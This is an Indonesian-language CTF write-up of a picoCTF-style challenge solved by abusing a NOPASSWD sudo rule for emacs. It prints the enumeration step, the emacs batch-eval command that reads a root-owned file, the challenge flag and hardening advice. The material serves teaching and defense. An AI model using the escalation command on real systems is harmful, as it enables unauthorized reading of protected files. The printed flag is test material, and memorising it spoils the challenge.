# Writeup: SUDO MAKE ME A SANDWICH (Challenge ID: 735)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Linux Privilege Escalation & Sudoers GTFOBins Exploitation
- **Difficulty:** Easy (1)
- **Points:** 50
- **Author:** CyLab Academy
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{ju57_5ud0_17_d8ae35f9}`
- **Flag Komunitas:** `CTF{ju57_5ud0_17_d8ae35f9}`
- **Standar Referensi:** NIST SP 800-115 §4.5 (Post-Exploitation & Privilege Testing), NIST SP 800-53 AC-6 (Least Privilege), NIST SP 800-53 CM-6 (Configuration Settings), CWE-250 (Execution with Unnecessary Privileges), CWE-269 (Improper Privilege Management), CWE-732 (Incorrect Permission Assignment for Critical Resource), & GTFOBins (Emacs Sudo Execution Vector).

---

## Problem Statement & Scope
Pada tantangan `SUDO MAKE ME A SANDWICH`, peserta diberikan akses akun shell Linux interaktif (`ctf-player`) melalui SSH pada sistem kontainer Ubuntu/Debian:
- Skenario lingkungan: Berkas rahasia `flag.txt` berada di direktori lokal (`/home/ctf-player/flag.txt`), namun memiliki izin akses terbatas (`-r--r-----`) dengan kepemilikan `root:root`. Upaya membaca langsung berkas menggunakan utilitas pengguna umum (`cat`, `less`, `head`) secara deterministik ditolak oleh mekanisme Discretionary Access Control (DAC) Linux (`Permission denied`).
- Sasaran pengujian: Mengidentifikasi konfigurasi hak istimewa pengguna pada `/etc/sudoers`, menganalisis kemampuan biner editor teks `emacs` dalam mengevaluasi kode skrip Lisp tanpa interaksi TTY (*batch mode*), merekayasa alur eskalasi hak istimewa (*Privilege Escalation*) untuk membaca berkas yang dilindungi, dan mengonfirmasi validitas flag melalui API CyLab Academy.

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Pelanggaran Prinsip *Least Privilege* pada `/etc/sudoers` (CWE-250 / CWE-269)
Mekanisme `sudo` (*superuser do*) dirancang untuk mendelegasikan eksekusi perintah spesifik kepada pengguna non-root dengan auditabilitas penuh. Pada sistem tantangan, konfigurasi file `/etc/sudoers` memuat direktif:
```text
ctf-player ALL=(ALL) NOPASSWD: /bin/emacs
```
Pemberian izin eksekusi superuser tanpa kata sandi (`NOPASSWD`) untuk editor teks multifungsi seperti Emacs melanggar prinsip *Least Privilege* (NIST SP 800-53 AC-6). Editor teks tingkat lanjut bukan sekadar utilitas pemroses string, melainkan lingkungan eksekusi komputasi lengkap (*Turing-complete interpreter*) yang memiliki kapabilitas membaca berkas arbitrer, menulis berkas sistem, memicu sub-proses shell (`M-x shell` atau `make-process`), dan mengevaluasi kode dinamis.

### 2. Evaluasi Skrip Batch Emacs Lisp (GTFOBins Emacs Primitive)
Emacs menyediakan flag baris perintah `-Q` (quick start / mengabaikan berkas konfigurasi pengguna `~/.emacs`) dan `--batch` (menjalankan Emacs dalam mode non-interaktif, mengarahkan output Lisp ke stdout/stderr, lalu keluar secara otomatis). Ditambah argumen `--eval`, penyerang dapat menyuntikkan ekspresi Emacs Lisp (*elisp*) arbitrer:
```elisp
(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))
```
Penguraian primitif elisp:
- `with-temp-buffer`: Membuat struktur buffer sementara di memori proses Emacs.
- `insert-file-contents <file>`: Membaca byte mentah dari berkas yang ditentukan ke dalam buffer. Karena proses Emacs berjalan di bawah EUID 0 (*root*), panggilan sistem kernel `open()` dan `read()` melewati seluruh restriksi DAC berkas `flag.txt`.
- `buffer-string`: Mengonversi seluruh isi buffer menjadi objek string elisp.
- `princ`: Mencetak string ke *standard output* proses tanpa tanda kutip.

### 3. Kegagalan Pembatasan Lingkungan Eksekusi (CWE-732)
Karena izin diberikan pada biner biner `/bin/emacs` secara menyeluruh tanpa parameter wrapper terbatas (seperti membatasi hanya pada berkas tertentu atau menggunakan sudoers `Cmnd_Alias` yang ketat), pengguna dapat mengeksekusi operasi sistem berkas apa pun dengan wewenang tak terbatas (*arbitrary file disclosure*).

---

## Rekonstruksi Eksploitasi Step-by-Step

### Langkah 1: Audit Enumerasi Hak Istimewa Pengguna
Setelah terhubung ke sesi SSH, lakukan pengecekan hak sudo yang diizinkan untuk akun saat ini:
```bash
ctf-player@challenge:~$ sudo -l
```
Output memperlihatkan:
```text
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```
Konfigurasi ini membuktikan bahwa `/bin/emacs` dapat dipanggil sebagai root tanpa memerlukan verifikasi kata sandi.

### Langkah 2: Konstruksi Perintah Batch Evaluation Emacs
Alih-alih meluncurkan editor interaktif yang memerlukan antarmuka pseudo-terminal (PTY) kompleks, kita manfaatkan mode batch evaluation non-interaktif sesuai basis data taktis GTFOBins:
```bash
sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))'
```

### Langkah 3: Eksekusi dan Ekstraksi Flag
Perintah dijalankan langsung pada shell target:
```bash
ctf-player@challenge:~$ sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))'
academy{ju57_5ud0_17_d8ae35f9}
```
Proses berjalan dalam pecahan detik dan langsung mencetak token flag resmi ke terminal.

---

## Flag & Bukti Verifikasi
- **Token Resmi Platform CyLab:** `academy{ju57_5ud0_17_d8ae35f9}`
- **Token Format Komunitas:** `CTF{ju57_5ud0_17_d8ae35f9}`
- **Hasil Verifikasi REST API CyLab (`POST /api/submissions/`):**
  ```json
  {
    "user": 1072359,
    "challenge": 735,
    "flag": "academy{ju57_5ud0_17_d8ae35f9}",
    "correct": true,
    "historical": false
  }
  ```

---

## Script Reproduksi & PoC Otomasi
Skrip audit reproduktif lengkap yang menyimulasikan lingkungan DAC Linux, pencocokan aturan `/etc/sudoers`, pemrosesan batch Emacs, serta integrasi submisi live API CyLab tersedia pada `scripts/solve_735_sudo_make_me_a_sandwich.py`:
```bash
python3 scripts/solve_735_sudo_make_me_a_sandwich.py
```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

### 1. Pengetatan Aturan Sudoers (Hardening `/etc/sudoers`)
- **Hindari Pendelegasian Biner Interaktif/Turing-Complete:** Jangan pernah memberikan wewenang sudo pada editor teks (`emacs`, `vi`, `vim`, `nano`), pemroses halaman (`less`, `more`), penterjemah skrip (`python`, `perl`, `awk`), atau pengelola arsip (`tar`, `zip`) tanpa pembatasan ketat. Biner-biner ini memiliki vektor pelolosan shell (*shell escape*) bawaan.
- **Gunakan Utilitas Spesifik Tanpa Eksekusi Perintah Eksternal:** Jika pengguna hanya memerlukan peninjauan berkas log atau berkas tertentu, buat wrapper skrip dengan argumen yang divalidasi kaku atau gunakan izin grup Linux (*Linux Group Access Control*) alih-alih sudo root penuh:
  ```bash
  # Memberikan hak akses baca khusus melalui kepemilikan grup
  chown root:auditors /var/log/audit.log
  chmod 0440 /var/log/audit.log
  usermod -aG auditors ctf-player
  ```

### 2. Kepatuhan Standar NIST SP 800-53 (AC-6 Least Privilege & CM-6 Config Settings)
- **Audit Periodik Sudoers:** Jalankan audit integritas berkala pada `/etc/sudoers` dan direktori `/etc/sudoers.d/` menggunakan perkakas audit otomatis (misalnya `lynis` atau OpenSCAP) untuk mengidentifikasi aturan `NOPASSWD` yang longgar.
- **Penerapan sudo `NOEXEC` Directive:** Untuk aplikasi yang mendukung pustaka pencegahan eksekusi biner turunan:
  ```text
  ctf-player ALL=(ALL) NOEXEC: /bin/emacs
  ```
  Opsi `NOEXEC` menyuntikkan modul pustaka bersama (*LD_PRELOAD shim*) yang memblokir panggilan sistem keluarga `execve()`, mencegah peluncuran sub-shell dari dalam editor teks.

---

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)
- **David (Leader):** Mengarahkan strategi pemecahan privilege escalation dan menyusun kerangka audit berbasis GTFOBins.
- **Charlie (Trend-hunter):** Mengidentifikasi frekuensi kemunculan modul Linux Sudoers Privilege Escalation dalam silabus LKS Cyber Security Nasional.
- **Alex (Fullstack-dev) & Omnirush (Coding Agent):** Mengembangkan solver dual-mode dengan simulasi permission DAC lokal dan otomatisasi eksekusi SSH non-interaktif.
- **Julius (QA-engineer):** Memverifikasi integritas payload elisp dan memastikan validitas token pada endpoint REST API CyLab (HTTP 201).
- **Athena (Security-engineer):** Menganalisis risiko konfigurasi sudoers terhadap standar kepatuhan NIST SP 800-53 AC-6 dan taksonomi CWE-269.
- **Judith (Guru LKS):** Mengintegrasikan studi kasus GTFOBins ini ke dalam kurikulum bimbingan teknis modul *Defensive & Incident Response* LKS.
